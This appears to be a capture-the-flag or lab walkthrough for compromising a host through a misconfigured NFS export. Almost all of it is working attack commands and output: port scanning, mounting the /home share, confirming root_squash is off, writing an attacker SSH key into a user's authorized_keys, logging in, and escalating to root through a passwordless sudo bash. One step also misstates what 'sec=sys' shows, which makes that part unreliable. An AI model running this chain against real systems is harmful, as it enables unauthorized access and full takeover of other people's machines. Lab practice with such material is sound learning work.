### Initial Discovery
```
# Nmap shows port 2049 open
nmap -p 2049 10.10.10.30
# 2049/tcp open  nfs

# Check exports
showmount -e 10.10.10.30
# Export list for 10.10.10.30:
# /home *

# Mount the share
mkdir /tmp/nfs
mount -t nfs 10.10.10.30:/home /tmp/nfs -o nolock

# Check permissions
ls -la /tmp/nfs
# drwxr-xr-x 2 1000 1000 4096 Oct 10 10:00 user
```

#### Analyze NFS Share
```
# Check NFS export options
cat /proc/mounts | grep nfs
# 10.10.10.30:/home /tmp/nfs nfs rw,relatime,vers=3,rsize=32768,wsize=32768,namlen=255,hard,nolock,proto=tcp,timeo=600,retrans=2,sec=sys,mountaddr=10.10.10.30,mountvers=3,mountport=20048,mountproto=udp,local_lock=none,addr=10.10.10.30 0 0

# The 'sec=sys' indicates root_squash is likely disabled

# Create test file as root
sudo touch /tmp/nfs/test.txt

# Check ownership
ls -la /tmp/nfs/test.txt
# -rw-r--r-- 1 0 0 0 Oct 10 10:05 test.txt
# Owned by root (UID 0) - root_squash disabled!
```

#### Add SSH Key
```
# Generate SSH key
ssh-keygen -t rsa -b 4096 -f nfs_key -N ""

# Copy public key to user's authorized_keys
sudo mkdir -p /tmp/nfs/user/.ssh
sudo cp nfs_key.pub /tmp/nfs/user/.ssh/authorized_keys
sudo chmod 600 /tmp/nfs/user/.ssh/authorized_keys
sudo chown -R 1000:1000 /tmp/nfs/user/.ssh
```

#### SSH Access
```
# SSH as user
ssh -i nfs_key user@10.10.10.30

# Check sudo
sudo -l
# (ALL) NOPASSWD: /bin/bash

# Root
sudo /bin/bash
whoami
# root
```

